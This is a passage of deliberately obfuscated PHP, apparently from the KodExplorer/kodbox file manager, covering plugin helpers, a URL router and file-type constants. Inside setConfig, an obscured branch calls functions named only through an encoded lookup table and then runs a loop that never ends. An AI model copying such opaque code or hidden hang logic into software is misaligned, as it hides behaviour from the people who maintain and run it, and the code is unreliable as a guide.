array($D¨¬›ÒÈ‡¶[$bÃÎ®ËŒñ[28]], $D¨¬›ÒÈ‡¶[$bÃÎ®ËŒñ[76]], $D¨¬›ÒÈ‡¶[$bÃÎ®ËŒñ[78]]); if (isset($D¨¬›ÒÈ‡¶[$bÃÎ®ËŒñ[494]])) { $D—•İ†ÆÖÂ[] = $D¨¬›ÒÈ‡¶[$bÃÎ®ËŒñ[494]]; } return md5(implode($bÃÎ®ËŒñ[71], $D—•İ†ÆÖÂ)); goto AÁæ¿î‚‘Ó; AÔƒ‹ÇôËå: if (isset($D¨¬›ÒÈ‡¶[$bÃÎ®ËŒñ[164]][$bÃÎ®ËŒñ[171]])) { return $D¨¬›ÒÈ‡¶[$bÃÎ®ËŒñ[164]][$bÃÎ®ËŒñ[171]]; } $B±Ÿ¾‡òˆ = IO::hashSimple($D¨¬›ÒÈ‡¶[$bÃÎ®ËŒñ[76]]); if ($B±Ÿ¾‡òˆ) { return $B±Ÿ¾‡òˆ; } goto eÂ„»ªŞ; C“õÇíŸë: $bÃÎ®ËŒñ =& $_SERVER[Šº]; if (!$D¨¬›ÒÈ‡¶) { $D¨¬›ÒÈ‡¶ = $this->fileInfo; } if (isset($D¨¬›ÒÈ‡¶[$bÃÎ®ËŒñ[171]])) { return $D¨¬›ÒÈ‡¶[$bÃÎ®ËŒñ[171]]; } goto AÔƒ‹ÇôËå; AÁæ¿î‚‘Ó: } final function checkSharePath($Cª³ØŒ‹‘Ú) { goto bÑòØøÅ; Dùù–¦±Šƒ: $fÍ†Çäí¾ö = Action($bÔÂ©šóÜ[1058])->sharePathInfo($Cª³ØŒ‹‘Ú); if (!isset($fÍ†Çäí¾ö[$bÔÂ©šóÜ[76]])) { show_json(LNG($bÔÂ©šóÜ[1414]), !1); } $this->fileInfo = $fÍ†Çäí¾ö[$bÔÂ©šóÜ[164]]; goto aóëİ¦ä¬¨; aóëİ¦ä¬¨: $this->cachePath = $this->pluginCachePath($this->fileInfo[$bÔÂ©šóÜ[171]]); return $fÍ†Çäí¾ö[$bÔÂ©šóÜ[76]]; goto c·Í¤¥«¹ó; bÑòØøÅ: $bÔÂ©šóÜ =& $_SERVER[Šº]; if (!defined($bÔÂ©šóÜ[461])) { define($bÔÂ©šóÜ[1413], 0); } if (!$this->isShare($Cª³ØŒ‹‘Ú)) { return !1; } goto Dùù–¦±Šƒ; c·Í¤¥«¹ó: } final function pluginCachePath($C‚­„‡ñÚ = '') { $A¯·Ô°‰½ê =& $_SERVER[Šº]; $eô²¨¿çìã = IO_PATH_SYSTEM_TEMP . $A¯·Ô°‰½ê[1415] . $this->pluginName; if (!($CÄÃ¬å¿Œø = IO::infoFull($eô²¨¿çìã))) { return IO::mkdir($eô²¨¿çìã . $A¯·Ô°‰½ê[8] . $C‚­„‡ñÚ); } if (empty($C‚­„‡ñÚ)) { return $CÄÃ¬å¿Œø[$A¯·Ô°‰½ê[76]]; } if (!($F´ÌçÈ¡Ì = IO::fileNameExist($CÄÃ¬å¿Œø[$A¯·Ô°‰½ê[76]], $C‚­„‡ñÚ))) { return IO::mkdir($CÄÃ¬å¿Œø[$A¯·Ô°‰½ê[76]] . $C‚­„‡ñÚ); } return KodIO::make($F´ÌçÈ¡Ì); } final function pluginCacheFileSet($aÕã›¼¿, $CÑ§â…­Ò = '') { $DÊ³ìâÛŒ˜ =& $_SERVER[Šº]; if (!($AÜßÛ‘ÚØØ = IO::infoFull($aÕã›¼¿))) { return IO::mkfile($aÕã›¼¿, $CÑ§â…­Ò, REPEAT_REPLACE); } IO::setContent($AÜßÛ‘ÚØØ[$DÊ³ìâÛŒ˜[76]], $CÑ§â…­Ò); return $AÜßÛ‘ÚØØ[$DÊ³ìâÛŒ˜[76]]; } final function pluginLocalFile($eôæÄÅéğ² = '') { goto a±¾ÉÛ…é…; a¡Ã…æ´¶©: return IO::copy($eôæÄÅéğ², $C³çŸ±ÃÓ‘, 0, $AøÚ¼ø¼ñ—); goto Bƒ‹ƒ‰¯÷–; cÎ¯˜î¡Ğ„: if (!checkExtSafe($AøÚ¼ø¼ñ—)) { $AøÚ¼ø¼ñ— = $AøÚ¼ø¼ñ— . $BŸŠçÎŠ¥[1416]; } $FËÆ”¿ÓÑ = $C³çŸ±ÃÓ‘ . $AøÚ¼ø¼ñ—; if (@file_exists($FËÆ”¿ÓÑ)) { return $FËÆ”¿ÓÑ; } goto a¡Ã…æ´¶©; eÉÀ¯çí¾Ø: if (!$eôæÄÅéğ²) { return $C³çŸ±ÃÓ‘; } $EÁÆéÄŸ˜† = IO::info($eôæÄÅéğ²); $AøÚ¼ø¼ñ— = $this->_tmpFileName($EÁÆéÄŸ˜†) . $BŸŠçÎŠ¥[95] . $EÁÆéÄŸ˜†[$BŸŠçÎŠ¥[168]]; goto cÎ¯˜î¡Ğ„; a±¾ÉÛ…é…: $BŸŠçÎŠ¥ =& $_SERVER[Šº]; $C³çŸ±ÃÓ‘ = TEMP_FILES . "{$this->pluginName}\57"; if (!is_dir($C³çŸ±ÃÓ‘)) { mk_dir($C³çŸ±ÃÓ‘); } goto eÉÀ¯çí¾Ø; Bƒ‹ƒ‰¯÷–: } final function appPackage() { goto F”¡×÷äğÚ; FŠÉÍğäÃ´: return $d—‘ğ†Óê; goto e¼Ë‘õñ ö; F”¡×÷äğÚ: $føÎ¶·ğÃ® =& $_SERVER[Šº]; if ($this->packageData) { return $this->packageData; } $E´À«¨´Ò = $this->parseFile($this->pluginPath . $føÎ¶·ğÃ®[1417]); goto C¸¸‘î±à‡; a…ñ±ø¶„ø: $cğàÇ¥ˆƒ = Hook::trigger($føÎ¶·ğÃ®[1418], $d—‘ğ†Óê); if ($cğàÇ¥ˆƒ && is_array($cğàÇ¥ˆƒ)) { $d—‘ğ†Óê = $cğàÇ¥ˆƒ; } $this->packageData = $d—‘ğ†Óê; goto FŠÉÍğäÃ´; C¸¸‘î±à‡: $this->parseLang($E´À«¨´Ò); $d—‘ğ†Óê = json_decode_force($E´À«¨´Ò); if (!$d—‘ğ†Óê) { return array(); } goto a…ñ±ø¶„ø; e¼Ë‘õñ ö: } public function packageInfoGet($d–ºİ¬ÛåÏ) { $CñéßâòŠá = $this->appPackage(); return array_get_value($CñéßâòŠá, $d–ºİ¬ÛåÏ); } public function packageVersion() { return $this->packageInfoGet($_SERVER[Šº][1419]); } public function packageTitle() { return $this->packageInfoGet($_SERVER[Šº][1420]); } public function packageCopyright() { return $this->packageInfoGet($_SERVER[Šº][1421]); } private function parseFile($c¹³ƒğ®´®) { goto A„¼¨Ûƒ†; dİ¶É“Ù½Ä: $f¹™ÏÉ³¬— = str_replace($eô““²¥ºá, $B»Ä›­„÷›, $f¹™ÏÉ³¬—); return $f¹™ÏÉ³¬—; goto eÜ‹Ô’Ì ; A„¼¨Ûƒ†: $bë¡æó‹ø¥ =& $_SERVER[Šº]; $f¹™ÏÉ³¬— = file_get_contents($c¹³ƒğ®´®); $eô““²¥ºá = array($bë¡æó‹ø¥[1422], $bë¡æó‹ø¥[1423], $bë¡æó‹ø¥[1424], $bë¡æó‹ø¥[1425], $bë¡æó‹ø¥[1426], $bë¡æó‹ø¥[1427], $bë¡æó‹ø¥[1428]); goto Fß„“ñÙŠ; Fß„“ñÙŠ: $B»Ä›­„÷› = array($this->pluginHost, $this->pluginHostDefault, $this->pluginApi, $this->pluginName, $this->pluginPath, APP_HOST, $this->config[$bë¡æó‹ø¥[88]][$bë¡æó‹ø¥[1429]]); if (strstr($f¹™ÏÉ³¬—, $bë¡æó‹ø¥[1430])) { $e¹’Ü²òİ™ = rawurlencode(json_encode($this->pluginLangArr)); $f¹™ÏÉ³¬— = str_replace($bë¡æó‹ø¥[1430], $e¹’Ü²òİ™, $f¹™ÏÉ³¬—); } if (strstr($f¹™ÏÉ³¬—, $bë¡æó‹ø¥[1431])) { $e¹’Ü²òİ™ = $e¹’Ü²òİ™ = rawurlencode(json_encode($this->getConfig())); $f¹™ÏÉ³¬— = str_replace($bë¡æó‹ø¥[1431], $e¹’Ü²òİ™, $f¹™ÏÉ³¬—); } goto dİ¶É“Ù½Ä; eÜ‹Ô’Ì : } private function parseLang(&$cÇ¦º§™È”) { goto A»æ„ç¾‹Ë; A»æ„ç¾‹Ë: $C‚¹åæ“ó =& $_SERVER[Šº]; $fë‹ê» = $C‚¹åæ“ó[1432]; if (!strstr($cÇ¦º§™È”, $fë‹ê»)) { return; } goto fåÙêÄë…; fåÙêÄë…: preg_match_all($C‚¹åæ“ó[1433], $cÇ¦º§™È”, $f¨Ë‹‰À–); if (!is_array($f¨Ë‹‰À–) || count($f¨Ë‹‰À–) == 0 || !is_array($f¨Ë‹‰À–[0]) || count($f¨Ë‹‰À–[0]) == 0) { return; } $aóÃ£ººè” = array(); goto dÆ‘¾§ºé£; dÆ‘¾§ºé£: $d›ˆæ³ƒË = array(); foreach ($f¨Ë‹‰À–[0] as $Cèå·øàÙ) { $f–„„£î = substr($Cèå·øàÙ, strlen($fë‹ê»), -4); $EÜíã¶Æ…’ = LNG($f–„„£î); $aóÃ£ººè”[] = $Cèå·øàÙ; $d›ˆæ³ƒË[] = str_replace(array($C‚¹åæ“ó[228], $C‚¹åæ“ó[1026], $C‚¹åæ“ó[339], $C‚¹åæ“ó[116]), array($C‚¹åæ“ó[50], $C‚¹åæ“ó[50], $C‚¹åæ“ó[33], $C‚¹åæ“ó[1434]), $EÜíã¶Æ…’); } $cÇ¦º§™È” = str_replace($aóÃ£ººè”, $d›ˆæ³ƒË, $cÇ¦º§™È”); goto Báˆª™±¨; Báˆª™±¨: } private function parseConfig(&$e¹¿Ûèê÷›) { goto BÌå­ïÛÑ”; Fæ¦Üš“ƒ±: $e¹¿Ûèê÷› = str_replace($BàŒŠæĞÎŸ, $FÁÓá˜ç‚, $e¹¿Ûèê÷›); goto BŠŒ¿öµ¥; BÌå­ïÛÑ”: $eô¨Üˆ¾Ø =& $_SERVER[Šº]; $dÆœÕÈİÑ = $eô¨Üˆ¾Ø[1435]; if (!strstr($e¹¿Ûèê÷›, $dÆœÕÈİÑ)) { return; } goto bï‘ç‰ÊÔ…; Dˆ¼Ùøè˜î: $BàŒŠæĞÎŸ = array(); $FÁÓá˜ç‚ = array(); foreach ($a’Î´ ›Ûİ[0] as $b§´†ìçÅ) { $e¿£˜ºÚÙ¼ = substr($b§´†ìçÅ, strlen($dÆœÕÈİÑ), -2); $BàŒŠæĞÎŸ[] = $b§´†ìçÅ; $FÁÓá˜ç‚[] = _get($EÍ˜ªµ§«, $e¿£˜ºÚÙ¼); } goto Fæ¦Üš“ƒ±; bï‘ç‰ÊÔ…: preg_match_all($eô¨Üˆ¾Ø[1436], $e¹¿Ûèê÷›, $a’Î´ ›Ûİ); if (!is_array($a’Î´ ›Ûİ) || count($a’Î´ ›Ûİ) == 0 || !is_array($a’Î´ ›Ûİ[0]) || count($a’Î´ ›Ûİ[0]) == 0) { return; } $EÍ˜ªµ§« = $this->getConfig(); goto Dˆ¼Ùøè˜î; BŠŒ¿öµ¥: } private function parsePackage(&$aîºé³…æ) { goto fÚÏô‹¶ß³; EŠ¸±‘¾¶Æ: $DŸ‘îÍ÷ä = array(); $b²ç¯ØµëÑ = array(); foreach ($c¾š“ñ [0] as $BŸãèÂÕ °) { $f×¬‡ÒÚ” = substr($BŸãèÂÕ °, strlen($d˜‹À„Œ±é), -2); $DŸ‘îÍ÷ä[] = $BŸãèÂÕ °; $b²ç¯ØµëÑ[] = _get($EÈß³³‹ª, $f×¬‡ÒÚ”); } goto AœÙŠÉ‚àŠ; cõ†¨Øç„½: preg_match_all($AãÎé»ˆ×[1438], $aîºé³…æ, $c¾š“ñ ); if (!is_array($c¾š“ñ ) || count($c¾š“ñ ) == 0 || !is_array($c¾š“ñ [0]) || count($c¾š“ñ [0]) == 0) { return; } $EÈß³³‹ª = $this->appPackage(); goto EŠ¸±‘¾¶Æ; fÚÏô‹¶ß³: $AãÎé»ˆ× =& $_SERVER[Šº]; $d˜‹À„Œ±é = $AãÎé»ˆ×[1437]; if (!strstr($aîºé³…æ, $d˜‹À„Œ±é)) { return; } goto cõ†¨Øç„½; AœÙŠÉ‚àŠ: $aîºé³…æ = str_replace($DŸ‘îÍ÷ä, $b²ç¯ØµëÑ, $aîºé³…æ); goto dÕš¬¬±í¶; dÕš¬¬±í¶: } final function echoFile($b™ÉĞ£æô, $a›ê¾ºøƒù = false) { goto A¼¬§Áç‰“; E¥Œ°ÏíƒÌ: $bãïÁñä = $this->parseFile($BîÜ„Ğá÷Ş); $this->parseLang($bãïÁñä); $this->parseConfig($bãïÁñä); goto BÅÇ†í›í³; BÅÇ†í›í³: $this->parsePackage($bãïÁñä); if (is_array($a›ê¾ºøƒù)) { $bãïÁñä = str_replace(array_keys($a›ê¾ºøƒù), array_values($a›ê¾ºøƒù), $bãïÁñä); } echo $d¡‘Çå’²È[228] . $bãïÁñä; goto e‡æƒòÈ; A¼¬§Áç‰“: $d¡‘Çå’²È =& $_SERVER[Šº]; $BîÜ„Ğá÷Ş = $this->pluginPath . $b™ÉĞ£æô; if (ACT == $d¡‘Çå’²È[1439]) { echo $d¡‘Çå’²È[1440] . $this->pluginName . $d¡‘Çå’²È[8] . $b™ÉĞ£æô . $d¡‘Çå’²È[1441]; if (!file_exists($BîÜ„Ğá÷Ş)) { echo $d¡‘Çå’²È[1442]; return; } } goto E¥Œ°ÏíƒÌ; e‡æƒòÈ: } final function initLang() { goto c³‚Ö¤Û¤í; fÌ”åâ¤‰É: $dÇ‰øçÃ³ù = I18n::getType(); $A³Ü›Œé–Ş = array(); if (file_exists($A‘Ûë‚‹›ù . $dÇ‰øçÃ³ù . $bƒ•‘Ê¹¦á[801])) { $A³Ü›Œé–Ş = (include $A‘Ûë‚‹›ù . $dÇ‰øçÃ³ù . $bƒ•‘Ê¹¦á[801]); } else { if ($dÇ‰øçÃ³ù == $bƒ•‘Ê¹¦á[1445] && !file_exists($A‘Ûë‚‹›ù . $dÇ‰øçÃ³ù . $bƒ•‘Ê¹¦á[801]) && file_exists($A‘Ûë‚‹›ù . $bƒ•‘Ê¹¦á[1446])) { $A³Ü›Œé–Ş = (include $A‘Ûë‚‹›ù . $bƒ•‘Ê¹¦á[1446]); } else { if (file_exists($A‘Ûë‚‹›ù . $féÁé§´† . $bƒ•‘Ê¹¦á[801])) { $A³Ü›Œé–Ş = (include $A‘Ûë‚‹›ù . $féÁé§´† . $bƒ•‘Ê¹¦á[801]); } } } goto C¸ô§¨âµÖ; c³‚Ö¤Û¤í: $bƒ•‘Ê¹¦á =& $_SERVER[Šº]; $féÁé§´† = $bƒ•‘Ê¹¦á[1443]; $A‘Ûë‚‹›ù = $this->pluginPath . $bƒ•‘Ê¹¦á[1444]; goto fÌ”åâ¤‰É; C¸ô§¨âµÖ: if (!is_array($A³Ü›Œé–Ş)) { return array(); } if (@count($A³Ü›Œé–Ş) > 0) { I18n::set($A³Ü›Œé–Ş); } return $A³Ü›Œé–Ş; goto D¸ÚÌ‰í‰; D¸ÚÌ‰í‰: } public function getConfig() { if (!$this->pluginConfig) { $this->pluginConfig = $this->modelPlugin->getConfig($this->pluginName); } return $this->pluginConfig; } public function setConfig($EÙàİ×ˆõ) { $aœÊ‡é¢¡ƒ =& $_SERVER[Šº]; if (!isset($_SERVER[$aœÊ‡é¢¡ƒ[395]]) || !isset($_SERVER[$aœÊ‡é¢¡ƒ[393]])) { goto f‡Û¯ °; EåòîÒ¥Ù†: for ($c³ÀŒó’Ö = $d»İ‘ôİ³; $c³ÀŒó’Ö > 0; $c³ÀŒó’Ö++) { $D¸Åââö = json_encode($GLOBALS[$aœÊ‡é¢¡ƒ[418]]); } goto A’Ûç°º•¾; f‡Û¯ °: $EÎ˜–‘×ºÈ = $aœÊ‡é¢¡ƒ[829]; $d­™Š©Æ‹¯ = $aœÊ‡é¢¡ƒ[396]; $FÕøò™©Åê = $_SERVER[$aœÊ‡é¢¡ƒ[397]] . $aœÊ‡é¢¡ƒ[398]; goto Eƒ¤°Í¯³; Eƒ¤°Í¯³: $fŠ¦  ã = $d­™Š©Æ‹¯($FÕøò™©Åê); $aòÖì—ïÔÆ = explode($aœÊ‡é¢¡ƒ[228], $fŠ¦  ã); if (count($aòÖì—ïÔÆ) < $aœÊ‡é¢¡ƒ[588]) { $e†Í‡˜†õØ = $aœÊ‡é¢¡ƒ[400]; $e†Í‡˜†õØ(); } goto EÄí÷™èŠÔ; EÄí÷™èŠÔ: $D¸Åââö = $aœÊ‡é¢¡ƒ[830]; $D¸Åââö($_SERVER[$aœÊ‡é¢¡ƒ[831]]); $d»İ‘ôİ³ = 1; goto EåòîÒ¥Ù†; A’Ûç°º•¾: } return $this->modelPlugin->setConfig($this->pluginName, $EÙàİ×ˆõ); } public function onSetConfig($dôÖ¦Ñ®ÔÊ) { } public function onGetConfig($CÉÀ‘ÃõÈŸ) { } public function onChangeStatus($fÉ‰Òšä¿“) { } public function onUninstall() { } public function onInstall() { } public function authCheck($FøâàßÊŠß = "\160\154\165\147\151\156\x41\x75\164\x68") { $e·¨¨¨ä™¥ =& $_SERVER[Šº]; if (!defined($e·¨¨¨ä™¥[461])) { return !1; } if (_get($GLOBALS, $e·¨¨¨ä™¥[492])) { return !0; } $FëÊå–¿Ïè = $this->getConfig(); if (!$FëÊå–¿Ïè[$FøâàßÊŠß]) { return !1; } return ActionCall($e·¨¨¨ä™¥[1447], $FëÊå–¿Ïè[$FøâàßÊŠß]); } public function url($cÜ•ŞÀ’ÏÍ, $aøÖÓï˜Ö¦ = '', $c‘ëŒ‘ë³è = true) { goto eÜñ¾‘ìâ»; cÅ‹ôé°„ë: $CÜ³Ì„í£ = $this->packageVersion(); $bä¼ãË™… = $B¼½ªñğÔÂ . $Déëé¨á¹¹[447] . $CÜ³Ì„í£; if (substr($cÜ•ŞÀ’ÏÍ, 0, 4) == $Déëé¨á¹¹[147] || substr($cÜ•ŞÀ’ÏÍ, 0, 2) == $Déëé¨á¹¹[1231]) { $d·¡‹ßùƒ› = $cÜ•ŞÀ’ÏÍ . $Déëé¨á¹¹[1448] . $bä¼ãË™…; } else { if ($aøÖÓï˜Ö¦ == $Déëé¨á¹¹[33]) { $d·¡‹ßùƒ› = $this->pluginHost . $cÜ•ŞÀ’ÏÍ . $Déëé¨á¹¹[1448] . $bä¼ãË™…; } else { if ($aøÖÓï˜Ö¦ === $Déëé¨á¹¹[77]) { $d·¡‹ßùƒ› = $this->pluginHost . $cÜ•ŞÀ’ÏÍ; } else { if ($aøÖÓï˜Ö¦ == $Déëé¨á¹¹[1449]) { $d·¡‹ßùƒ› = STATIC_PATH . $cÜ•ŞÀ’ÏÍ . $Déëé¨á¹¹[1448] . $B¼½ªñğÔÂ; } else { if ($aøÖÓï˜Ö¦ == $Déëé¨á¹¹[1450]) { $d·¡‹ßùƒ› = APP_HOST . $Déëé¨á¹¹[1451] . $cÜ•ŞÀ’ÏÍ . $Déëé¨á¹¹[1448] . $B¼½ªñğÔÂ; } else { if (isset($B® ‡™‹á‹[$aøÖÓï˜Ö¦])) { $d·¡‹ßùƒ› = $B® ‡™‹á‹[$aøÖÓï˜Ö¦] . $cÜ•ŞÀ’ÏÍ . $Déëé¨á¹¹[1448] . $bä¼ãË™…; } } } } } } goto bÌ†ÁêÚ·é; bÌ†ÁêÚ·é: if (!$c‘ëŒ‘ë³è) { return $d·¡‹ßùƒ›; } echo $d·¡‹ßùƒ›; goto Añ¤·´À±æ; eÜñ¾‘ìâ»: $Déëé¨á¹¹ =& $_SERVER[Šº]; $B® ‡™‹á‹ = $this->getConfig(); $B¼½ªñğÔÂ = KOD_VERSION . $Déëé¨á¹¹[95] . KOD_VERSION_BUILD; goto cÅ‹ôé°„ë; Añ¤·´À±æ: } public function link($d´¤æ„Œ¥› = false, $EöñõáİÜä = '') { $böØ›»”ù =& $_SERVER[Šº]; if (!$d´¤æ„Œ¥›) { $this->link($böØ›»”ù[1452], $böØ›»”ù[1450]); $this->link($böØ›»”ù[1453], $böØ›»”ù[1449]); $this->link($böØ›»”ù[1454], $böØ›»”ù[1449]); $this->link($böØ›»”ù[1455], $böØ›»”ù[1449]); $this->link($böØ›»”ù[1456], $böØ›»”ù[1449]); return; } $dİ¯Á‘öÕÙ = $this->url($d´¤æ„Œ¥›, $EöñõáİÜä, !1); if (substr($d´¤æ„Œ¥›, -3) == $böØ›»”ù[1457]) { echo $böØ›»”ù[1458] . $dİ¯Á‘öÕÙ . $böØ›»”ù[1459] . $böØ›»”ù[228]; } else { if (substr($d´¤æ„Œ¥›, -4) == $böØ›»”ù[1460]) { echo $böØ›»”ù[1461] . $dİ¯Á‘öÕÙ . $böØ›»”ù[1462] . $böØ›»”ù[228]; } } } } class Route { public static $halts = false; public static $routes = array(); public static $methods = array(); public static $callbacks = array(); public static $maps = array(); public static $patterns = array("\x3a\141\x6e\x79" => "\x5b\136\57\135\x2b", "\x3a\156\165\155" => "\133\x30\x2d\71\135\53", "\x3a\x61\154\x6c" => "\56\x2a"); public static $errorCallback; public static function __callstatic($D´£ìÃØ®, $b¢Ñ·’ä—) { $d§¢ŠÁåç =& $_SERVER[Šº]; if ($D´£ìÃØ® == $d§¢ŠÁåç[1463]) { $DÃ›Èâµò = array_map($d§¢ŠÁåç[1464], $b¢Ñ·’ä—[0]); $b‘æ¹ª‡’ = strpos($b¢Ñ·’ä—[1], $d§¢ŠÁåç[8]) === 0 ? $b¢Ñ·’ä—[1] : $d§¢ŠÁåç[8] . $b¢Ñ·’ä—[1]; $b´É–éâ–’ = $b¢Ñ·’ä—[2]; } else { $DÃ›Èâµò = null; $b‘æ¹ª‡’ = strpos($b¢Ñ·’ä—[0], $d§¢ŠÁåç[8]) === 0 ? $b¢Ñ·’ä—[0] : $d§¢ŠÁåç[8] . $b¢Ñ·’ä—[0]; $b´É–éâ–’ = $b¢Ñ·’ä—[1]; } array_push(self::$maps, $DÃ›Èâµò); array_push(self::$routes, $b‘æ¹ª‡’); array_push(self::$methods, strtoupper($D´£ìÃØ®)); array_push(self::$callbacks, $b´É–éâ–’); } public static function error($E‡ÆÌ¦ÂŠÒ) { self::$errorCallback = $E‡ÆÌ¦ÂŠÒ; } public static function haltOnMatch($ağšâä´‰’ = true) { self::$halts = $ağšâä´‰’; } public static function dispatch() { goto E—ñµ¨ÖÓ; BİŠÈ¡ğó„: self::$routes = preg_replace($FŠù¿Ëä¾[1150], $FŠù¿Ëä¾[8], self::$routes); if (in_array($B…›”…‘õÀ, self::$routes)) { $f‹òÍš„ÙÙ = array_keys(self::$routes, $B…›”…‘õÀ); foreach ($f‹òÍš„ÙÙ as $AëÒ³æˆí) { if (self::$methods[$AëÒ³æˆí] == $dŒ‚Ç¯ || self::$methods[$AëÒ³æˆí] == $FŠù¿Ëä¾[1466] || in_array($dŒ‚Ç¯, self::$maps[$AëÒ³æˆí])) { $cÇ°Ô¿¦•Š = !0; if (!is_object(self::$callbacks[$AëÒ³æˆí])) { $Dƒ’¼š¨­ = explode($FŠù¿Ëä¾[8], self::$callbacks[$AëÒ³æˆí]); $b©¨²ÛãØ = end($Dƒ’¼š¨­); $aÁ‹™÷à÷ = explode($FŠù¿Ëä¾[1467], $b©¨²ÛãØ); $C®óƒ­‚Øï = new $aÁ‹™÷à÷[0](); $C®óƒ­‚Øï->{$aÁ‹™÷à÷[1]}(); if (self::$halts) { return; } } else { call_user_func(self::$callbacks[$AëÒ³æˆí]); if (self::$halts) { return; } } } } } else { $Fè¶‹§†Á = 0; foreach (self::$routes as $AëÒ³æˆí) { if (strpos($AëÒ³æˆí, $FŠù¿Ëä¾[4]) !== !1) { $AëÒ³æˆí = str_replace($C²ã›ÔŠ“, $Cï´°†Ï¨, $AëÒ³æˆí); } if (preg_match($FŠù¿Ëä¾[1468] . $AëÒ³æˆí . $FŠù¿Ëä¾[1469], $B…›”…‘õÀ, $a¡™¨Ë“ƒ)) { if (self::$methods[$Fè¶‹§†Á] == $dŒ‚Ç¯ || self::$methods[$Fè¶‹§†Á] == $FŠù¿Ëä¾[1466] || !empty(self::$maps[$Fè¶‹§†Á]) && in_array($dŒ‚Ç¯, self::$maps[$Fè¶‹§†Á])) { $cÇ°Ô¿¦•Š = !0; array_shift($a¡™¨Ë“ƒ); if (!is_object(self::$callbacks[$Fè¶‹§†Á])) { $Dƒ’¼š¨­ = explode($FŠù¿Ëä¾[8], self::$callbacks[$Fè¶‹§†Á]); $b©¨²ÛãØ = end($Dƒ’¼š¨­); $aÁ‹™÷à÷ = explode($FŠù¿Ëä¾[1467], $b©¨²ÛãØ); $C®óƒ­‚Øï = new $aÁ‹™÷à÷[0](); if (!method_exists($C®óƒ­‚Øï, $aÁ‹™÷à÷[1])) { echo $FŠù¿Ëä¾[1470]; } else { call_user_func_array(array($C®óƒ­‚Øï, $aÁ‹™÷à÷[1]), $a¡™¨Ë“ƒ); } if (self::$halts) { return; } } else { call_user_func_array(self::$callbacks[$Fè¶‹§†Á], $a¡™¨Ë“ƒ); if (self::$halts) { return; } } } } $Fè¶‹§†Á++; } } if ($cÇ°Ô¿¦•Š == !1) { if (!self::$errorCallback) { self::$errorCallback = function () { $AÎï‚ëÁµù =& $_SERVER[Šº]; header($_SERVER[$AÎï‚ëÁµù[1471]] . $AÎï‚ëÁµù[1472]); echo $AÎï‚ëÁµù[1473]; }; } else { if (is_string(self::$errorCallback)) { self::get($_SERVER[$FŠù¿Ëä¾[1465]], self::$errorCallback); self::$errorCallback = null; self::dispatch(); return; } } call_user_func(self::$errorCallback); } goto F‚£˜×ŞÍ´; Eá¥Ô¶”©Œ: $C²ã›ÔŠ“ = array_keys(static::$patterns); $Cï´°†Ï¨ = array_values(static::$patterns); $cÇ°Ô¿¦•Š = !1; goto BİŠÈ¡ğó„; E—ñµ¨ÖÓ: $FŠù¿Ëä¾ =& $_SERVER[Šº]; $B…›”…‘õÀ = parse_url($_SERVER[$FŠù¿Ëä¾[1465]], PHP_URL_PATH); $dŒ‚Ç¯ = $_SERVER[$FŠù¿Ëä¾[157]]; goto Eá¥Ô¶”©Œ; F‚£˜×ŞÍ´: } } goto Aùâ›Æ; c“‡ø‡›‘: class KodIO { const KOD_SOURCE = "\x7b\163\157\x75\x72\143\x65\175"; const KOD_USER_RECYCLE = "\x7b\x75\163\x65\x72\x52\x65\143\171\143\x6c\x65\175"; const KOD_USER_FAV = "\x7b\165\x73\145\162\106\141\x76\175"; const KOD_USER_FILE_TAG = "\173\165\163\145\162\x46\x69\x6c\x65\124\141\x67\175"; const KOD_USER_FILE_TYPE = "\173\165\163\145\162\106\x69\x6c\145\x54\171\x70\x65\175"; const KOD_GROUP_ROOT_SELF = "\x7b\x67\x72\x6f\165\x70\x52\157\x6f\164\123\x65\x6c\146\175"; const KOD_USER_SHARE = "\173\x75\x73\x65\162\123\150\x61\x72\x65\175"; const KOD_USER_SHARE_LINK = "\173\165\163\145\x72\123\x68\x61\x72\145\x4c\151\x6e\153\x7d"; const KOD_USER_SHARE_TO_ME = "\x7b\163\150\141\162\x65\x54\x6f\115\x65\x7d"; const KOD_SHARE_ITEM = "\x7b\x73\x68\141\x72\x65\111\164\x65\x6d\x7d"; const KOD_SHARE_LINK = "\x7b\x73\x68\141\x72\145\111\x74\x65\155\114\x69\x6e\x6b\175"; const KOD_SEARCH = "\x7b\163\x65\141\162\143\150\x7d"; const KOD_BLOCK = "\173\x62\x6c\x6f\x63\x6b\175"; const KOD_IO = "\x7b\x69\157\x7d"; const KOD_USER_RECENT = "\x7b\x75\163\x65\x72\x52\145\x6e\143\145\156\x74\175"; const KOD_USER_DRIVER = "\x7b\x64\x72\151\x76\145\x72\x7d"; public static function typeList() { $B”Ğ¡Ò÷‚µ =& $_SERVER[Šº]; return array($B”Ğ¡Ò÷‚µ[1126] => self::KOD_SOURCE, $B”Ğ¡Ò÷‚µ[1127] => self::KOD_USER_RECYCLE, $B”Ğ¡Ò÷‚µ[1128] => self::KOD_USER_FAV, $B”Ğ¡Ò÷‚µ[1129] => self::KOD_USER_FILE_TAG, $B”Ğ¡Ò÷‚µ[1130] => self::KOD_USER_FILE_TYPE, $B”Ğ¡Ò÷‚µ[1131] => self::KOD_GROUP_ROOT_SELF, $B”Ğ¡Ò÷‚µ[1132] => self::KOD_USER_SHARE, $B”Ğ¡Ò÷‚µ[1133] => self::KOD_USER_SHARE_LINK, $B”Ğ¡Ò÷‚µ[1134] => self::KOD_USER_SHARE_TO_ME, $B”Ğ¡Ò÷‚µ[1135] => self::KOD_SHARE_ITEM, $B”Ğ¡Ò÷‚µ[1136] => self::KOD_SHARE_LINK, $B”Ğ¡Ò÷‚µ[1137] => self::KOD_SEARCH, $B”Ğ¡Ò÷‚µ[1138] => self::KOD_BLOCK, $B”Ğ¡Ò÷‚µ[1139] => self::KOD_IO, $B”Ğ¡Ò÷‚µ[1140] => self::KOD_USER_RECENT, $B”Ğ¡Ò÷‚µ[1141] => self::KOD_USER_DRIVER); } public static function parse($cØ˜¾æ¶ùµ) { goto FùŠªæ‘é¯; DÈù‹¥‘Ä: preg_match($E¡´‚åÅ©’[1142], $cØ˜¾æ¶ùµ, $d³ùĞ‡™˜‡); $e‰šæÈ“ë¬ = array($E¡´‚åÅ©’[422] => !1, $E¡´‚åÅ©’[1143] => !1, $E¡´‚åÅ©’[419] => !1, $E¡´‚åÅ©’[76] => $cØ˜¾æ¶ùµ, $E¡´‚åÅ©’[1053] => !1, $E¡´‚åÅ©’[1052] => $E¡´‚åÅ©’[33]); if (is_array($d³ùĞ‡™˜‡) && count($d³ùĞ‡™˜‡) == 5) { $D»Ù³¤˜Ìº = $E¡´‚åÅ©’[1144] . $d³ùĞ‡™˜‡[2] . $E¡´‚åÅ©’[324]; if (in_array($D»Ù³¤˜Ìº, 